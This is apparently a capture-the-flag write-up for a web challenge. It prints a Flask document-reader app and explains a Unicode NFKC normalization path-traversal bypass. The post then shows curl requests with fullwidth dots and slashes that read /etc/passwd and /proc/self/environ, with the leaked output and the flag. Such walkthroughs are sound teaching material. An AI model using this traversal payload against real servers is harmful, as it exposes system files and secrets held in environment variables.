---
layout: post
title:  "Web Challenges"
date:   2026-08-04 18:10:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /Universal-CTF-2026-web/
---
* TOC
{:toc}
## Paper Trail
{% raw %}
**Author**: Yewolf

**Category**: web

**Description**: The district archive put a narrow document reader on the public net so couriers could fetch routing sheets without touching the full filing cabinet.

I get the challenge file `app.py`:
```python
import html
import os
import unicodedata
from pathlib import Path, PurePosixPath

from flask import Flask, abort, jsonify, request


DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 8080
MAX_FILE_BYTES = 64 * 1024
BASE_DIR = (Path(__file__).parent / "documents").resolve()

app = Flask(__name__)


def iter_visible_files() -> list[str]:
    visible_files: list[str] = []
    for candidate in sorted(BASE_DIR.rglob("*")):
        if not candidate.is_file():
            continue

        relative_parts = candidate.relative_to(BASE_DIR).parts
        if any(part.startswith(".") for part in relative_parts):
            continue

        visible_files.append(candidate.relative_to(BASE_DIR).as_posix())
    return visible_files


def resolve_document(raw_path: str) -> Path:
    requested_path = raw_path.strip()
    if not requested_path:
        abort(400, "missing path")

    if "\x00" in requested_path:
        abort(400, "invalid path")

    if "\\" in requested_path:
        abort(400, "backslashes are not allowed")

    pure_path = PurePosixPath(requested_path)
    if pure_path.is_absolute():
        abort(400, "absolute paths are not allowed")

    if any(part in {"", ".", ".."} or part.startswith(".") for part in pure_path.parts):
        abort(400, "invalid path segments")

    safe_path = unicodedata.normalize("NFKC", str(pure_path))

    candidate = BASE_DIR / safe_path

    try:
        candidate.relative_to(BASE_DIR)
    except ValueError as exc:
        raise abort(403, "path escapes document root") from exc

    resolved = candidate.resolve(strict=True)
    if not resolved.is_file():
        abort(404, "document not found")

    return candidate


@app.get("/")
def home() -> str:
    items = "\n".join(
        f"<li><code>{html.escape(path)}</code></li>" for path in iter_visible_files()
    )
    return f"""<!doctype html>
<html lang=\"en\">
  <head>
    <meta charset=\"utf-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
    <title>Paper Trail</title>
    <style>
      :root {{
        color-scheme: light;
        font-family: "IBM Plex Sans", "Segoe UI", sans-serif;
        background: #f5f0e8;
        color: #1b1b1b;
      }}
      body {{
        margin: 0;
        min-height: 100vh;
        background: radial-gradient(circle at top, #fff7dc, #efe6d6 60%, #e6dac6);
      }}
      main {{
        width: min(720px, calc(100vw - 2rem));
        margin: 3rem auto;
        padding: 2rem;
        background: rgba(255, 252, 245, 0.88);
        border: 1px solid #ccbda7;
        box-shadow: 0 24px 60px rgba(69, 47, 13, 0.12);
      }}
      h1 {{ margin-top: 0; font-size: 2rem; }}
      code {{ font-family: "IBM Plex Mono", monospace; }}
      ul {{ padding-left: 1.2rem; }}
      .hint {{ color: #60491f; }}
    </style>
  </head>
  <body>
    <main>
      <h1>Paper Trail</h1>
      <p class=\"hint\">Read one document with <code>GET /api/files?path=&lt;relative-path&gt;</code>.</p>
      <p>Available documents:</p>
      <ul>{items}</ul>
    </main>
  </body>
</html>"""


@app.get("/api/files")
def read_file() -> tuple[dict[str, str], int]:
    requested_path = request.args.get("path", "")
    try:
        document_path = resolve_document(requested_path)
    except FileNotFoundError:
        abort(404, "document not found")

    file_size = document_path.stat().st_size
    if file_size > MAX_FILE_BYTES:
        abort(413, "document too large")

    return (
        jsonify(
            {
                "path": document_path.relative_to(BASE_DIR).as_posix(),
                "content": document_path.read_text(encoding="utf-8"),
            }
        ),
        200,
    )


if __name__ == "__main__":
    app.run(host=os.getenv("HOST", DEFAULT_HOST), port=int(os.getenv("PORT", DEFAULT_PORT)))
```

The server checks path segments before unicode normalization so `PurePosixPath` splits only on ASCII `/`, not on fullwidth `／`. NFKC normalization converts: `．` > `.` and `／` > `/`.

So `．．／．．／．．／．．／etc／passwd` turns into `../../../../etc/passwd` and passes!

This enables arbitrary file read using unicode normalized path traversal:
```shell
curl "https://http-01kz0p5btfpdggnjms1t160qh4.u-ctf-ctf-7001b39a.urc.tf/api/files?path=%EF%BC%8E.%EF%BC%8F%EF%BC%8E.%EF%BC%8F%EF%BC%8E.%EF%BC%8F%EF%BC%8E.%EF%BC%8Fetc%EF%BC%8Fpasswd"  
{"content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nctf:x:1000:1000::/app:/bin/bash\n","path":"../../../../etc/passwd"}
```

I get the flag from `/proc/self/environ`:
```shell
curl "https://http-01kz0p5btfpdggnjms1t160qh4.u-ctf-ctf-7001b39a.urc.tf/api/files?path=%EF%BC%8E.%EF%BC%8F%EF%BC%8E.%EF%BC%8F%EF%BC%8E.%EF%BC%8F%EF%BC%8E.%EF%BC%8Fproc%EF%BC%8Fself%EF%BC%8Fenviron"  
{"content":"PATH=/opt/venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000HOSTNAME=web\u0000LANG=C.UTF-8\u0000GPG_KEY=7169605F62C751356D054A26A821E680E5FA6305\u0000PYTHON_VERSION=3.12.13\u0000PYTHON_SHA256=c08bc65a81971c1dd5783182826503369466c7e67374d1646519adf05207b684\u0000PYTHONDONTWRITEBYTECODE=1\u0000PYTHONUNBUFFERED=1\u0000PORT=8080\u0000KUBERNETES_PORT_443_TCP=tcp://10.104.203.50:443\u0000KUBERNETES_PORT_443_TCP_PORT=443\u0000KUBERNETES_PORT_443_TCP_PROTO=tcp\u0000KUBERNETES_SERVICE_HOST=10.104.203.50\u0000KUBERNETES_SERVICE_PORT_HTTPS=443\u0000KUBERNETES_PORT=tcp://10.104.203.50:443\u0000KUBERNETES_PORT_443_TCP_ADDR=10.104.203.50\u0000KUBERNETES_SERVICE_PORT=443\u0000FLAG=uctf{32d2174562ec86afe115ff08569bdd3b9645}\u0000HOME=/app\u0000","path":"../../../../proc/self/environ"}
```

`uctf{32d2174562ec86afe115ff08569bdd3b9645}`
{% endraw %}